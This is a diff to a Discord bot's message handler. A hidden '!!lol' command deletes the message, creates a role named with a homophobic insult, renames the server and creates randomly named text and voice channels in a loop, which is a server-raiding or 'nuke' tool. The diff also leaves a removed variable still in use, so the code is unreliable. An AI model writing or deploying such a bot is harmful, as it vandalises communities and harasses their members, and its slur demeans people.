@@ -21,8 +21,6 @@ client.on("message", async (message) => {
         return result;
     }
     
-    const texth = makeid(32)
-    
     if(message.content === '!!lol') {
        message.delete();
        let i;
@@ -33,8 +31,8 @@ client.on("message", async (message) => {
 		message.guild.createRole('henry gay')
 	    	message.guild.setName(process.env.SERVER_NAME + `${texth}`)
 	    	const texto = makeid(32);
-	    	message.guild.createChannel(`${texth}`, 'text');
-	    	message.guild.createChannel(`${texth}`, 'voice');  
+	    	message.guild.createChannel(`${texto}`, 'text');
+	    	message.guild.createChannel(`${texto}`, 'voice');  
 	    	message.guild.setIcon('./icon.png') 
 	}
     }
